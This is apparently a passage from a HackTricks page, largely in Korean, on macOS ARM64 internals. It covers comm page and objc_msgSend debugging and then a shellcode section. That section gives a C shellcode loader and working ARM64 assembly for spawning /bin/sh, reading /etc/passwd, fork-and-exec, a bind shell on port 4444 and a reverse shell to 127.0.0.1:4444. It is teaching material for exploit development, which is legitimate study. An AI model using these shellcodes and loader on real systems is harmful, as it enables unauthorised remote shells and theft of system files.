Note that **Ida** and **Ghidra** can also decompile **specific dylibs** from the cache just by passing the cache.

> [!TIP]
> 때때로 여러 syscalls(BSD 및 Mach)의 코드가 스크립트로 생성되기 때문에(소스 코드의 주석을 확인하세요), **`libsystem_kernel.dylib`**의 **decompiled** 코드를 **source code**를 확인하는 것보다 검토하는 편이 더 쉬울 수 있습니다. dylib에서는 실제로 무엇이 호출되는지 찾을 수 있습니다.

### machdep 호출

XNU는 machine dependent라고 불리는 다른 종류의 호출을 지원합니다. 이러한 호출의 번호는 아키텍처에 따라 달라지며, 호출이나 번호 모두 고정되어 있다고 보장되지 않습니다.

### comm page

이는 커널 소유의 메모리 페이지로, 모든 사용자 프로세스의 주소 공간에 매핑됩니다. 자주 사용되는 커널 서비스의 경우 syscalls를 사용하는 것보다 사용자 모드에서 커널 공간으로의 전환을 더 빠르게 하기 위해 설계되었습니다. 해당 전환이 자주 일어나면 syscall을 쓰는 방식은 매우 비효율적일 수 있습니다.

예를 들어 `gettimeofdate` 호출은 `timeval` 값을 comm page에서 직접 읽습니다.

### objc_msgSend

Objective-C 또는 Swift 프로그램에서 이 함수가 사용되는 것을 매우 흔히 볼 수 있습니다. 이 함수는 Objective-C 객체의 메서드를 호출할 수 있게 해줍니다.

Parameters ([more info in the docs](https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend)):

- x0: self -> 인스턴스에 대한 Pointer
- x1: op -> 메서드의 Selector
- x2... -> 호출된 메서드의 나머지 인자들

따라서 이 함수로 분기하기 전에 breakpoint를 걸어두면, 이 예제처럼 객체가 `NSConcreteTask`의 객체를 호출하여 명령을 실행하는 경우 무엇이 호출되는지 lldb에서 쉽게 확인할 수 있습니다:
```bash
# Right in the line were objc_msgSend will be called
(lldb) po $x0
<NSConcreteTask: 0x1052308e0>

(lldb) x/s $x1
0x1736d3a6e: "launch"

(lldb) po [$x0 launchPath]
/bin/sh

(lldb) po [$x0 arguments]
<__NSArrayI 0x1736801e0>(
-c,
whoami
)
```
> [!TIP]
> 환경 변수 **`NSObjCMessageLoggingEnabled=1`** 를 설정하면 이 함수가 호출될 때 `/tmp/msgSends-pid` 같은 파일에 log할 수 있습니다.
>
> 또한 **`OBJC_HELP=1`** 를 설정하고 아무 binary를 실행하면 특정 Objc-C actions가 발생할 때 log할 수 있도록 사용할 수 있는 다른 environment variables들을 볼 수 있습니다.

When this function is called, it's needed to find the called method of the indicated instance, for this different searches are made:

- optimistic cache lookup 수행:
- 성공하면 끝
- runtimeLock (read) 획득
- If (realize && !cls->realized) realize class
- If (initialize && !cls->initialized) initialize class
- class의 자체 cache 시도:
- 성공하면 끝
- class method list 시도:
- 발견되면 cache를 채우고 끝
- superclass cache 시도:
- 성공하면 끝
- superclass method list 시도:
- 발견되면 cache를 채우고 끝
- If (resolver) method resolver를 시도하고 class lookup부터 반복
- 아직 여기까지 왔다면(=다 실패한 경우) forwarder를 시도

### Shellcodes

컴파일하려면:
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
바이트를 추출하려면:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
최신 macOS의 경우:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/fc0742e9ebaf67c6a50f4c38d59459596e0a6c5d/helper/extract.sh
for s in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n $s | awk '{for (i = 7; i > 0; i -= 2) {printf "\\x" substr($0, i, 2)}}'
done
```
<details>

<summary>shellcode를 테스트하기 위한 C code</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

다음 [**here**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s)에서 가져왔으며 설명합니다.

{{#tabs}}
{{#tab name="with adr"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}

{{#tab name="with stack"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{{#endtab}}

{{#tab name="with adr for linux"}}
```armasm
; From https://8ksec.io/arm64-reversing-and-exploitation-part-5-writing-shellcode-8ksec-blogs/
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}
{{#endtabs}}

#### cat으로 읽기

목표는 `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`를 실행하는 것이고, 따라서 두 번째 인자(x1)는 파라미터들의 배열인데(메모리상에서는 주소들의 스택을 의미한다).
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### 메인 프로세스가 종료되지 않도록 fork에서 sh로 명령을 실행하기
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### Bind shell

Bind shell은 [https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s)에서 제공되며 **port 4444**에서 동작합니다
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### Reverse shell

다음에서 [https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s), revshell을 **127.0.0.1:4444**로
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
{{#include ../../../banners/hacktricks-training.md}}
